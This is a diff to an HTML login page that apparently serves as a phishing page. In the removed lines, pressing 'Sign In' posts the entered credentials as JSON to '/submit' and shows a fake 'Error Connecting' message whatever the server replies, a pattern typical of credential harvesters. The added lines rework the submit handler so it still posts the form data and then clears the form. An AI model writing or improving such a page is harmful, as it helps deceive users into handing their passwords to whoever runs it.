@@ -109,7 +109,7 @@
                 </div>
             </div>
             
-            <button class="proceed-button" onclick='sendMessage()' type="button" id="sendMessageButton">Sign In</button>
+            <button class="proceed-button" type="button" id="sendMessageButton">Sign In</button>
             <div class="text-center">
                 <a href="#" class="text-decoration-none">Need to find your password?</a>
             </div>
@@ -137,21 +137,38 @@
                 this.textContent = type === 'password' ? 'Show' : 'Hide';
             });
         });
+
+        document.getElementById('sendMessageButton').addEventListener('click', function(e) {
+    e.preventDefault();
+    sendMessage();
+});
     
 function sendMessage() {
   const form = document.getElementById('conforpky');
   const formData = new FormData(form);
-  const sendButton = form.querySelector(".proceed-button");
-  sendButton.textContent = "Error Connecting";
-  sendButton.classList.add("error-button");
-  sendButton.disabled = true;
+  const data = {};
+  formData.forEach((value, key) => data[key] = value);
   
+  // Use absolute path to ensure proper routing
   fetch("/submit", {
     method: "POST",
     headers: {
       'Content-Type': 'application/json'
     },
-    body: JSON.stringify(Object.fromEntries(formData))
+    body: JSON.stringify(data)
+  })
+  .then(response => {
+    if (!response.ok) {
+      throw new Error('Network response was not ok');
+    }
+    return response.json();
+  })
+  .then(data => {
+    console.log('Success:', data);
+    form.reset();
+  })
+  .catch(error => {
+    console.error('Error:', error);
   });
 }
 
